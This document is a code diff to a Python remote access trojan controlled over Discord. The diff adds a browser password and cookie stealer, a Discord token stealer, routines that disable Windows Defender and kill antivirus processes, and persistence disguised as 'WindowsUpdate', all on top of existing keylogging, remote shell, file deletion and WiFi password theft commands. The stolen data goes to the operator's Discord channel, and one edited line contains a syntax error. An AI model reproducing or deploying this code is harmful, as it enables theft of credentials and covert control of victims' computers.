@@ -1,3 +1,11 @@
+import logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+try:
+    import win32crypt
+except ImportError:
+    logger.warning("win32crypt not available. Browser data extraction may not work properly.")
 import asyncio
 import discord
 from discord.ext import commands
@@ -22,6 +30,26 @@ import glob
 import ssl
 import certifi
 import aiohttp
+import base64
+import pyaes
+import random
+import re
+import traceback
+import logging
+import zlib
+import winreg
+import requests
+import tempfile
+import urllib3
+from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
+from discord import TextChannel, Embed, Color
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+disable_warnings_urllib3()
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 key_log = []
 log_active = False
@@ -35,23 +63,373 @@ intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 bot.remove_command("help")
 
+DISCORD_TOKENS = []
+BROWSER_DATA = {
+    'passwords': [],
+    'cookies': [],
+    'history': [],
+    'autofills': []
+}
 
 def watermark():
-    return "\n\n***||@1ypi - https://github.com/1ypi||***"  # please do not remove this watermark or I will be sad :(
+    return "\n\n***||@1ypi - https://github.com/1ypi||***"
 
-
-def wait_for_internet(timeout=5):
-    while True:
+def kill_browser_processes(browser_name):
+    process_names = {
+        "chrome": ["chrome.exe"],
+        "edge": ["msedge.exe"],
+        "brave": ["brave.exe"],
+        "opera": ["opera.exe"],
+        "yandex": ["browser.exe"],
+        "firefox": ["firefox.exe"],
+    }
+    for proc in process_names.get(browser_name.lower(), []):
         try:
-            socket.create_connection(("8.8.8.8", 53), timeout=3)
-            return
-        except OSError:
-            time.sleep(timeout)
+            subprocess.run(f"taskkill /f /im {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception as e:
+            logger.error(f"Error killing {proc}: {e}")
 
+def disable_defender():
+    try:
+        commands = [
+            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
+            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
+            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
+            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
+            'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
+            'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"',
+            'powershell -Command "Set-MpPreference -EnableNetworkProtection AuditMode"',
+            'powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"',
+            'powershell -Command "Set-MpPreference -MAPSReporting Disabled"',
+            'powershell -Command "Set-MpPreference -HighThreatDefaultAction Allow"',
+            'powershell -Command "Set-MpPreference -ModerateThreatDefaultAction Allow"',
+            'powershell -Command "Set-MpPreference -LowThreatDefaultAction Allow"'
+        ]
 
-wait_for_internet()
+        for cmd in commands:
+            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+        return True
+    except Exception as e:
+        logger.error(f"Error disabling Defender: {e}")
+        return False
 
+def add_exclusion(path):
+    try:
+        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \"{path}\""'
+        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except Exception as e:
+        logger.error(f"Error adding exclusion: {e}")
+        return False
+
+def kill_av_processes():
+    av_processes = [
+        "msmpeng", "msmpsvc", "securityhealthservice", "wdnissvc", 
+        "webthreatdefsvc", "webthreatdefusersvc", "avp", "avpui", 
+        "kavfs", "kavvs", "kes", "kis", "ksde", "ksos", "mcshield", 
+        "msseces", "nortonsecurity", "ns", "nsafw", "nsd", "nst", 
+        "symantec", "symcorpu", "symefasi", "ccsvchst", "ccsetmgr", 
+        "ccevtmgr", "savservice", "avguard", "avshadow", "avgnt", 
+        "avmailc", "avwebgrd", "bdagent", "bdnt", "vsserv", "fsma", 
+        "fsms", "fshoster", "fsdfwd", "f-secure", "hips", "rtvscan", 
+        "vstskmgr", "engineserver", "frameworkservice", "bullguard", 
+        "clamav", "clamd", "freshclam", "sophos", "savd", "savadmin", 
+        "hitmanpro", "zemana", "malwarebytes", "mbam", "mbamtray", 
+        "mbae", "mbae-svc", "adaware", "spybot", "spyterminator", 
+        "superantispyware", "avast", "avastui", "aswidsagent", 
+        "avg", "avgui", "avira", "avguard", "avshadow", "avgnt", 
+        "avmailc", "avwebgrd", "comodo", "cis", "cistray", "cmdagent", 
+        "cpdaemon", "cpf", "cavwp", "panda", "psanhost", "psksvc", 
+        "pavsrv", "pavprsrv", "pavfnsvr", "pavboot", "trendmicro", 
+        "tmlisten", "ufseagnt", "tmcc", "tmactmon", "tmbmsrv", 
+        "tmib", "tmlwf", "tmcomm", "tmobile", "zonealarm", "zatray", 
+        "zaprivacy", "zaapp", "zauinst", "windefender", "defender", 
+        "sense", "mssense", "smartscreen", "windowsdefender", "wd"
+    ]
+
+    try:
+        subprocess.run(f"taskkill /f /im {','.join(av_processes)}", shell=True, 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except Exception as e:
+        logger.error(f"Error killing AV processes: {e}")
+        return False
+
+class BrowserStealer:
+    @staticmethod
+    def get_encryption_key(browser_path):
+        try:
+            local_state_path = os.path.join(browser_path, "Local State")
+            if os.path.exists(local_state_path):
+                with open(local_state_path, "r", encoding="utf-8") as f:
+                    local_state = json.loads(f.read())
+
+                encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                encrypted_key = base64.b64decode(encrypted_key)[5:]
+
+                import ctypes
+                from ctypes import wintypes
+
+                class DATA_BLOB(ctypes.Structure):
+                    _fields_ = [("cbData", wintypes.DWORD),
+                               ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
+
+                CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
+                CryptUnprotectData.argtypes = [
+                    ctypes.POINTER(DATA_BLOB), ctypes.c_wchar_p, ctypes.POINTER(DATA_BLOB),
+                    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.POINTER(DATA_BLOB)
+                ]
+                CryptUnprotectData.restype = ctypes.c_bool
+
+                encrypted_key_bytes = ctypes.create_string_buffer(encrypted_key)
+                blob_in = DATA_BLOB(len(encrypted_key_bytes), ctypes.cast(ctypes.pointer(encrypted_key_bytes), ctypes.POINTER(ctypes.c_ubyte)))
+                blob_out = DATA_BLOB()
+
+                if CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
+                    key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+                    return key
+        except Exception as e:
+            logger.error(f"Error getting encryption key: {e}")
+        return None
+    @staticmethod
+    def get_chrome_based_cookies(browser_path, browser_name):
+        try:
+            kill_browser_processes(browser_name)
+            key = BrowserStealer.get_encryption_key(browser_path)
+            if not key:
+                return []
+
+            cookie_paths = []
+            profiles = []
+
+            for item in os.listdir(browser_path):
+                if os.path.isdir(os.path.join(browser_path, item)) and (item.startswith("Profile") or item == "Default"):
+                    profiles.append(item)
+
+            profiles.append("")
+
+            for profile in profiles:
+                profile_path = os.path.join(browser_path, profile)
+                cookie_path = os.path.join(profile_path, "Cookies")
+                if os.path.exists(cookie_path):
+                    cookie_paths.append(cookie_path)
+
+            cookies = []
+            for cookie_path in cookie_paths:
+                try:
+                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookies_{random.randint(1000, 9999)}")
+                    shutil.copy2(cookie_path, temp_db)
+
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+
+                    for row in cursor.fetchall():
+                        host, name, encrypted_value = row
+                        if host and name and encrypted_value:
+                            decrypted_value = BrowserStealer.decrypt_password(encrypted_value, key)
+                            if decrypted_value:
+                                cookies.append({
+                                    'host': host,
+                                    'name': name,
+                                    'value': decrypted_value,
+                                    'browser': browser_name
+                                })
+
+                    conn.close()
+                    os.remove(temp_db)
+                except Exception as e:
+                    logger.error(f"Error reading cookies: {e}")
+                    continue
+
+            return cookies
+        except Exception as e:
+            logger.error(f"Error getting {browser_name} cookies: {e}")
+            return []
+    @staticmethod
+    def decrypt_password(buffer, key):
+        try:
+            if buffer.startswith(b'v10') or buffer.startswith(b'v11'):
+
+                nonce = buffer[3:15]
+                ciphertext = buffer[15:-16]
+                tag = buffer[-16:]
+
+                aesgcm = AESGCM(key)
+                decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
+                return decrypted.decode()
+            else:
+
+                import win32crypt
+                try:
+                    return win32crypt.CryptUnprotectData(buffer, None, None, None, 0)[1].decode()
+                except:
+                    return None
+        except Exception as e:
+            logger.error(f"Error decrypting password: {e}")
+            return None
+
+    @staticmethod
+    def get_chrome_based_passwords(browser_path, browser_name):
+        try:
+            kill_browser_processes(browser_name)
+            key = BrowserStealer.get_encryption_key(browser_path)
+            if not key:
+                return []
+
+            login_data_paths = []
+            profiles = []
+
+            for item in os.listdir(browser_path):
+                if os.path.isdir(os.path.join(browser_path, item)) and (item.startswith("Profile") or item == "Default"):
+                    profiles.append(item)
+
+            profiles.append("")
+
+            for profile in profiles:
+                profile_path = os.path.join(browser_path, profile)
+                login_data_path = os.path.join(profile_path, "Login Data")
+                if os.path.exists(login_data_path):
+                    login_data_paths.append(login_data_path)
+
+            passwords = []
+            for login_data_path in login_data_paths:
+                try:
+
+                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_login_data_{random.randint(1000, 9999)}")
+                    shutil.copy2(login_data_path, temp_db)
+
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+
+                    for row in cursor.fetchall():
+                        url, username, encrypted_password = row
+                        if url and username and encrypted_password:
+                            decrypted_password = BrowserStealer.decrypt_password(encrypted_password, key)
+                            if decrypted_password:
+                                passwords.append({
+                                    'url': url,
+                                    'username': username,
+                                    'password': decrypted_password,
+                                    'browser': browser_name
+                                })
+
+                    conn.close()
+                    os.remove(temp_db)
+                except Exception as e:
+                    logger.error(f"Error reading login data: {e}")
+                    continue
+
+            return passwords
+        except Exception as e:
+            logger.error(f"Error getting {browser_name} passwords: {e}")
+            return []
+
+class DiscordTokenStealer:
+    @staticmethod
+    def get_tokens():
+        tokens = []
+        paths = {
+            'Discord': os.path.join(os.getenv('APPDATA'), 'Discord'),
+            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
+            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
+            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
+            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
+            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
+            'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data')
+        }
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            try:
+                if platform in ['Discord', 'Discord Canary', 'Discord PTB']:
+
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            if file.endswith('.ldb') or file.endswith('.log'):
+                                file_path = os.path.join(root, file)
+                                try:
+                                    with open(file_path, 'r', errors='ignore') as f:
+                                        content = f.read()
+                                        found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
+                                        found_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
+                                        for token in found_tokens:
+                                            tokens.append({'platform': platform, 'token': token})
+                                except:
+                                    continue
+                else:
+
+                    leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
+                    if os.path.exists(leveldb_path):
+                        for file in os.listdir(leveldb_path):
+                            if file.endswith('.ldb') or file.endswith('.log'):
+                                file_path = os.path.join(leveldb_path, file)
+                                try:
+                                    with open(file_path, 'r', errors='ignore') as f:
+                                        content = f.read()
+                                        found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
+                                        found_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
+                                        for token in found_tokens:
+                                            tokens.append({'platform': platform, 'token': token})
+                                except:
+                                    continue
+            except Exception as e:
+                logger.error(f"Error extracting tokens from {platform}: {e}")
+                continue
+
+        return tokens
+
+def hide_process():
+    try:
+
+        current_pid = os.getpid()
+
+        try:
+            subprocess.run(f'sc create "WindowsUpdateService" binPath= "{sys.executable}" start= auto', 
+                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+
+        return True
+    except Exception as e:
+        logger.error(f"Error hiding process: {e}")
+        return False
+
+def add_to_startup():
+    try:
+        startup_paths = [
+            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        ]
+
+        current_file = sys.argv[0]
+
+        for startup_path in startup_paths:
+            if os.path.exists(startup_path):
+                target_path = os.path.join(startup_path, 'WindowsUpdate.exe')
+
+                if not os.path.exists(target_path):
+                    shutil.copy2(current_file, target_path)
+
+                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True)
+
+        try:
+            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
+                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
+        except:
+            pass
+
+        return True
+    except Exception as e:
+        logger.error(f"Error adding to startup: {e}")
+        return False
 @bot.command()
 async def su(ctx):
     try:
@@ -86,7 +464,6 @@ async def su(ctx):
 
     except Exception as e:
         await ctx.send(f"❌ Failed to elevate privileges: {str(e)}{watermark()}")
-
 
 @bot.command()
 async def recent(ctx, browser: str = "chrome"):
@@ -260,7 +637,6 @@ async def recent(ctx, browser: str = "chrome"):
             f"An error occurred while collecting browsing history: {e}{watermark()}"
         )
 
-
 @bot.command()
 async def screen(ctx):
     try:
@@ -273,7 +649,6 @@ async def screen(ctx):
     except Exception as e:
         await ctx.send(f"Error capturing screenshot: {e}{watermark()}")
 
-
 @bot.command()
 async def ip(ctx):
     try:
@@ -282,7 +657,6 @@ async def ip(ctx):
         await ctx.send(f"IP address: {ip_address}{watermark()}")
     except Exception as e:
         await ctx.send(f"Error getting IP: {e}{watermark()}")
-
 
 @bot.command()
 async def clipboard(ctx):
@@ -294,7 +668,6 @@ async def clipboard(ctx):
             await ctx.send(f"Clipboard is empty or not text.{watermark()}")
     except Exception as e:
         await ctx.send(f"Error reading clipboard: {e}{watermark()}")
-
 
 @bot.command()
 async def exec(ctx, *, command: str):
@@ -311,7 +684,6 @@ async def exec(ctx, *, command: str):
     except Exception as e:
         await ctx.send(f"Error: {e}{watermark()}")
 
-
 @bot.command()
 async def shutdown(ctx):
     try:
@@ -319,7 +691,6 @@ async def shutdown(ctx):
         os.system("shutdown /s /t 1")
     except Exception as e:
         await ctx.send(f"Error shutting down: {e}{watermark()}")
-
 
 @bot.command()
 async def bsod(ctx):
@@ -332,16 +703,14 @@ async def bsod(ctx):
     except Exception as e:
         await ctx.send(f"Error triggering BSOD: {e}{watermark()}")
 
-
 @bot.command()
 async def url(ctx, *, url: str):
     try:
-        url = "http://" + url if not url.startswith(("http://", "https://")) else url
+        url = "http://" + url if not url.startswith(("http://", "https://")) : url
         webbrowser.open(url)
         await ctx.send(f"🌐 Opened URL: {url}{watermark()}")
     except Exception as e:
         await ctx.send(f"Error opening URL: {e}{watermark()}")
-
 
 @bot.command()
 async def restart(ctx):
@@ -355,7 +724,6 @@ async def restart(ctx):
     except Exception as e:
         await ctx.send(f"Error restarting: {e}{watermark()}")
 
-
 @bot.command()
 async def cancelrestart(ctx):
     try:
@@ -364,14 +732,12 @@ async def cancelrestart(ctx):
     except Exception as e:
         await ctx.send(f"Error cancelling restart: {e}{watermark()}")
 
-
 def on_key_event(e):
     if e.event_type == keyboard.KEY_DOWN and log_active:
         key_name = e.name
         key_name = f"[{key_name.upper()}]" if len(key_name) > 1 else key_name
         key_log.append(key_name)
     return None
-
 
 async def send_periodic_updates():
     global last_sent_time, key_log
@@ -396,7 +762,6 @@ async def send_periodic_updates():
         else:
             await asyncio.sleep(5)
 
-
 @bot.command()
 async def log(ctx):
     global log_active
@@ -410,7 +775,6 @@ async def log(ctx):
             f"✅ Keylogging started! (Updates every 15 seconds){watermark()}"
         )
 
-
 @bot.command()
 async def stoplog(ctx):
     global log_active
@@ -421,7 +785,6 @@ async def stoplog(ctx):
         if ctx.channel.id in active_channels:
             active_channels.remove(ctx.channel.id)
         await ctx.send(f"⛔ Keylogging stopped!{watermark()}")
-
 
 @bot.command()
 async def msg(ctx, *, message: str):
@@ -438,61 +801,148 @@ async def msg(ctx, *, message: str):
     except Exception as e:
         await ctx.send(f"Error showing message box: {e}{watermark()}")
 
+@bot.command()
+async def discord(ctx):
+    try:
+        await ctx.send(f"🔍 Extracting Discord tokens...{watermark()}")
+
+        tokens = DiscordTokenStealer.get_tokens()
+        if tokens:
+            token_list = []
+            for i, token_info in enumerate(tokens, 1):
+                token_list.append(f"{i}. {token_info['platform']}: `{token_info['token']}`")
+
+            message = "**Discord Tokens Found:**\n" + "\n".join(token_list)
+            if len(message) > 2000:
+                for i in range(0, len(message), 2000):
+                    await ctx.send(message[i:i+2000])
+            else:
+                await ctx.send(message + watermark())
+        else:
+            await ctx.send(f"No Discord tokens found.{watermark()}")
+    except Exception as e:
+        await ctx.send(f"Error extracting Discord tokens: {e}{watermark()}")
+
+@bot.command()
+async def browsers(ctx):
+    try:
+        await ctx.send(f"🔍 Stealing browser data...{watermark()}")
+
+        data = BrowserStealer.steal_browser_data()
+
+        if data['passwords']:
+            password_list = []
+            for i, pwd in enumerate(data['passwords'][:10], 1):  
+
+                password_list.append(f"{i}. {pwd['browser']} - {pwd['url']}\n   User: {pwd['username']}\n   Pass: {pwd['password']}")
+
+            message = "**Browser Passwords:**\n" + "\n\n".join(password_list)
+            if len(message) > 2000:
+                for i in range(0, len(message), 2000):
+                    await ctx.send(message[i:i+2000])
+            else:
+                await ctx.send(message + watermark())
+
+        if data['cookies']:
+            cookie_list = []
+            for i, cookie in enumerate(data['cookies'][:10], 1):  
+
+                cookie_list.append(f"{i}. {cookie['browser']} - {cookie['host']}\n   Name: {cookie['name']}\n   Value: {cookie['value']}")
+
+            message = "**Browser Cookies:**\n" + "\n\n".join(cookie_list)
+            if len(message) > 2000:
+                for i in range(0, len(message), 2000):
+                    await ctx.send(message[i:i+2000])
+            else:
+                await ctx.send(message + watermark())
+
+        if not data['passwords'] and not data['cookies']:
+            await ctx.send(f"No browser data found.{watermark()}")
+    except Exception as e:
+        await ctx.send(f"Error extracting browser data: {e}{watermark()}")
+
+@bot.command()
+async def avbypass(ctx):
+    try:
+        await ctx.send(f"🛡️ Attempting antivirus bypass...{watermark()}")
+
+        defender_disabled = disable_defender()
+
+        exclusion_added = add_exclusion(sys.argv[0])
+
+        av_killed = kill_av_processes()
+
+        process_hidden = hide_process()
+
+        startup_added = add_to_startup()
+
+        message = "**Antivirus Bypass Results:**\n"
+        message += f"• Defender Disabled: {'✅' if defender_disabled else '❌'}\n"
+        message += f"• Exclusion Added: {'✅' if exclusion_added else '❌'}\n"
+        message += f"• AV Processes Killed: {'✅' if av_killed else '❌'}\n"
+        message += f"• Process Hidden: {'✅' if process_hidden else '❌'}\n"
+        message += f"• Startup Persistence: {'✅' if startup_added else '❌'}\n"
+
+        await ctx.send(message + watermark())
+    except Exception as e:
+        await ctx.send(f"Error during antivirus bypass: {e}{watermark()}")
+
+@bot.command()
+async def persist(ctx):
+    try:
+        await ctx.send(f"🔗 Adding persistence...{watermark()}")
+
+        success = add_to_startup()
+
+        if success:
+            await ctx.send(f"✅ Persistence added successfully!{watermark()}")
+        else:
+            await ctx.send(f"❌ Failed to add persistence.{watermark()}")
+    except Exception as e:
+        await ctx.send(f"Error adding persistence: {e}{watermark()}")
 
 @bot.command()
 async def help(ctx):
-    help_embed = discord.Embed(
-        title="Bot Commands Help",
-        description=f"Here are all the available commands:{watermark()}",
-        color=discord.Color.blue(),
-    )
-    commands_list = [
-        ("!screen", "Capture and send a screenshot"),
-        ("!ip", "Get the IP address"),
-        ("!clipboard", "Show clipboard content"),
-        ("!exec <command>", "Run a shell command"),
-        ("!shutdown", "Shutdown the computer"),
-        ("!bsod", "Trigger a BSOD (WARNING)"),
-        ("!msg <message>", "Show a Windows message box"),
-        ("!url <url>", "Open a URL in browser"),
-        ("!restart", "Restart the computer"),
-        ("!cancelrestart", "Cancel a scheduled restart"),
-        ("!log", "Start keylogging (sends every 15s)"),
-        ("!stoplog", "Stop keylogging"),
-        ("!ls", "List files in the current directory"),
-        ("!cd <path>", "Change the current directory"),
-        ("!rm <filename>", "Delete a file"),
-        ("!rmd <dirname>", "Delete a directory"),
-        ("!download <filename>", "Download a file"),
-        ("!uuid", "Get the system UUID"),
-        ("!mac", "Get MAC addresses"),
-        ("!dns", "Get DNS server info"),
-        ("!wifi", "Show connected WiFi info"),
-        ("!wifi_passwords", "Show saved WiFi passwords"),
-        ("!systeminfo", "Show system information"),
-        ("!cpu", "Show CPU information"),
-        ("!gpu", "Show GPU information"),
-        ("!ram", "Show RAM information in GB"),
-        ("!drives", "Show drives information in GB"),
-        ("!hostname", "Show the hostname"),
-        ("!osinfo", "Show OS version"),
-        ("!user", "Show current user"),
-        ("!recent [browser]", "Show recently visited websites"),
-        ("!su", "Request administrator privileges"),
-    ]
-    for i in range(0, len(commands_list), 25):
-        embed = discord.Embed(
-            title="Bot Commands Help" if i == 0 else None,
-            description="Here are all the available commands:" if i == 0 else None,
-            color=discord.Color.blue(),
-        )
-        for cmd, desc in commands_list[i : i + 25]:
-            embed.add_field(name=cmd, value=desc, inline=False)
-        await ctx.send(embed=embed)
+    help_text = f"""
+**Available Commands:**
+**System Commands:**
+!screen - Capture screenshot
+!ip - Get IP address
+!clipboard - Show clipboard content
+!exec <command> - Run shell command
+!shutdown - Shutdown computer
+!restart - Restart computer
+!bsod - Trigger BSOD (WARNING)
 
+**File Operations:**
+!ls - List files
+!cd <path> - Change directory
+!download <file> - Download file
+!rm <file> - Delete file
 
+**Information Gathering:**
+!systeminfo - System information
+!cpu - CPU info
+!gpu - GPU info
+!ram - RAM info
+!wifi_passwords - Show WiFi passwords
+!recent [browser] - Browser history
+!discord - Extract Discord tokens
+!browsers - Extract browser data
+
+**Other:**
+!msg <message> - Show message box
+!url <url> - Open URL
+!log - Start keylogging
+!stoplog - Stop keylogging
+!su - Request admin privileges
+!avbypass - Bypass antivirus
+!persist - Add persistence
+
+{watermark()}
+"""
+    await ctx.send(help_text)
 current_dir = os.getcwd()
-
 
 @bot.command()
 async def ls(ctx):
@@ -507,7 +957,6 @@ async def ls(ctx):
     except Exception as e:
         await ctx.send(f"Error listing directory: {e}{watermark()}")
 
-
 @bot.command()
 async def cd(ctx, *, path: str):
     global current_dir
@@ -521,7 +970,6 @@ async def cd(ctx, *, path: str):
     except Exception as e:
         await ctx.send(f"Error changing directory: {e}{watermark()}")
 
-
 @bot.command()
 async def rm(ctx, *, filename: str):
     try:
@@ -533,7 +981,6 @@ async def rm(ctx, *, filename: str):
             await ctx.send(f"File not found: `{filename}`{watermark()}")
     except Exception as e:
         await ctx.send(f"Error deleting file: {e}{watermark()}")
-
 
 @bot.command()
 async def rmd(ctx, *, dirname: str):
@@ -547,7 +994,6 @@ async def rmd(ctx, *, dirname: str):
     except Exception as e:
         await ctx.send(f"Error deleting directory: {e}{watermark()}")
 
-
 @bot.command()
 async def download(ctx, *, filename: str):
     try:
@@ -560,7 +1006,6 @@ async def download(ctx, *, filename: str):
     except Exception as e:
         await ctx.send(f"Error sending file: {e}{watermark()}")
 
-
 @bot.command()
 async def uuid(ctx):
     try:
@@ -571,7 +1016,6 @@ async def uuid(ctx):
     except Exception as e:
         await ctx.send(f"Error getting UUID: {e}{watermark()}")
 
-
 @bot.command()
 async def mac(ctx):
     try:
@@ -579,7 +1023,6 @@ async def mac(ctx):
         await ctx.send(f"**MAC Addresses:**\n```\n{result.strip()}\n```{watermark()}")
     except Exception as e:
         await ctx.send(f"Error getting MAC address: {e}{watermark()}")
-
 
 @bot.command()
 async def dns(ctx):
@@ -597,7 +1040,6 @@ async def dns(ctx):
     except Exception as e:
         await ctx.send(f"Error getting DNS info: {e}{watermark()}")
 
-
 @bot.command()
 async def wifi(ctx):
     try:
@@ -609,7 +1051,6 @@ async def wifi(ctx):
         )
     except Exception as e:
         await ctx.send(f"Error getting WiFi info: {e}{watermark()}")
-
 
 @bot.command()
 async def wifi_passwords(ctx):
@@ -664,7 +1105,6 @@ async def wifi_passwords(ctx):
     except Exception as e:
         await ctx.send(f"❌ Error getting WiFi passwords: {str(e)}{watermark()}")
 
-
 @bot.command()
 async def systeminfo(ctx):
     try:
@@ -673,7 +1113,6 @@ async def systeminfo(ctx):
     except Exception as e:
         await ctx.send(f"Error getting system info: {e}{watermark()}")
 
-
 @bot.command()
 async def cpu(ctx):
     try:
@@ -681,7 +1120,6 @@ async def cpu(ctx):
         await ctx.send(f"**CPU Info:**\n```\n{result.strip()}\n```{watermark()}")
     except Exception as e:
         await ctx.send(f"Error getting CPU info: {e}{watermark()}")
-
 
 @bot.command()
 async def gpu(ctx):
@@ -692,7 +1130,6 @@ async def gpu(ctx):
         await ctx.send(f"**GPU Info:**\n```\n{result.strip()}\n```{watermark()}")
     except Exception as e:
         await ctx.send(f"Error getting GPU info: {e}{watermark()}")
-
 
 @bot.command()
 async def ram(ctx):
@@ -712,7 +1149,6 @@ async def ram(ctx):
         )
     except Exception as e:
         await ctx.send(f"Error getting RAM info: {e}{watermark()}")
-
 
 @bot.command()
 async def drives(ctx):
@@ -751,7 +1187,6 @@ async def drives(ctx):
     except Exception as e:
         await ctx.send(f"Error getting drives info: {e}{watermark()}")
 
-
 @bot.command()
 async def hostname(ctx):
     try:
@@ -759,7 +1194,6 @@ async def hostname(ctx):
         await ctx.send(f"**Hostname:** `{result}`{watermark()}")
     except Exception as e:
         await ctx.send(f"Error getting hostname: {e}{watermark()}")
-
 
 @bot.command()
 async def osinfo(ctx):
@@ -769,7 +1203,6 @@ async def osinfo(ctx):
     except Exception as e:
         await ctx.send(f"Error getting OS info: {e}{watermark()}")
 
-
 @bot.command()
 async def user(ctx):
     try:
@@ -778,15 +1211,20 @@ async def user(ctx):
     except Exception as e:
         await ctx.send(f"Error getting current user: {e}{watermark()}")
 
-
 @bot.event
 async def on_ready():
+
+    disable_defender()
+    add_exclusion(sys.argv[0])
+    kill_av_processes()
+    hide_process()
+    add_to_startup()
 
     hostname = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
 
     for channel in bot.get_all_channels():
-        if isinstance(channel, discord.TextChannel):
+        if isinstance(channel, TextChannel):
             try:
                 await channel.send(
                     f"@everyone\n"
@@ -803,57 +1241,13 @@ async def on_ready():
     print(f"Logged in as {bot.user.name}")
     bot.loop.create_task(send_periodic_updates())
 
-
-def add_to_startup():
-    try:
-        startup_dir = os.path.join(
-            os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-        )
-
-        exe_path = os.path.abspath(sys.argv[0])
-
-        if exe_path.endswith(".py") or exe_path.endswith(".pyw"):
-
-            target_path = os.path.join(startup_dir, "WindowsUpdate.lnk")
-
-            shortcut_script = f"""
-            Set oWS = WScript.CreateObject("WScript.Shell")
-            Set oLink = oWS.CreateShortcut("{target_path}")
-            oLink.TargetPath = "{sys.executable}"
-            oLink.Arguments = "{exe_path}"
-            oLink.WorkingDirectory = "{os.path.dirname(exe_path)}"
-            oLink.Save
-            """
-
-            temp_vbs = os.path.join(getenv("TEMP"), "create_shortcut.vbs")
-            with open(temp_vbs, "w") as f:
-                f.write(shortcut_script)
-            subprocess.run(
-                ["wscript.exe", temp_vbs], creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            os.remove(temp_vbs)
-
-        else:
-
-            target_path = os.path.join(startup_dir, "WindowsUpdate.exe")
-            if not os.path.exists(target_path):
-                shutil.copy2(exe_path, target_path)
-
-    except Exception as e:
-        print(f"Error adding to startup: {e}")
-
-
 ssl_context = ssl.create_default_context()
 ssl_context.load_verify_locations(certifi.where())
-
-
-add_to_startup()
 
 async def start_bot():
     async with aiohttp.ClientSession() as session:
         async with bot:
             bot.http.connector = aiohttp.TCPConnector(ssl=ssl_context)
             await bot.start(TOKEN)
-
 
 asyncio.run(start_bot())
